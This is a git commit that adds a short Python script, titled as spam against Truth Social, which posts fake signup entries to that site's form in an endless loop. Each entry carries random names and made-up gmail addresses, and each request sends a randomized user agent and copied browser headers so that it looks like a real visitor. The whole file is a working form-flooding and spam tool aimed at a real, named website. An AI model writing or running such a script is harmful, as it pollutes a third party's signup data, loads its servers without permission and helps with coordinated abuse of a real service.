3f22a107f967970da8802d94e6797604f834ef0e
rhijjawi <18570300+rhijjawi@users.noreply.github.com>
2021-10-26 22:25:06 +0300

    FuckTruthSocial - Random Spam.py

---
+++ postspammer.py
@@ -0,0 +1,36 @@
+
+import requests
+import json
+import string
+import random
+from user_agent import generate_user_agent #pip install user_agent
+
+truthsocial = "https://www.truthsocial.com/"
+count = 0
+
+def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
+    return ''.join(random.choice(chars) for _ in range(size))
+while True:
+    headers = {
+        'User-Agent': f'{generate_user_agent()}',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Referer': 'https://www.truthsocial.com/',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Origin': 'https://www.truthsocial.com',
+        'DNT': '1',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-User': '?1',
+        'Sec-GPC': '1',
+        'TE': 'trailers',
+    }
+    d = {'first_name': id_generator(), 'last_name': id_generator(), 'email' : f'{id_generator()}@gmail.com', 'phone': '', 'offers': 'on'}
+    w = requests.post(truthsocial, data=d, headers=headers)
+    count += 1
+    print(count)
+
+
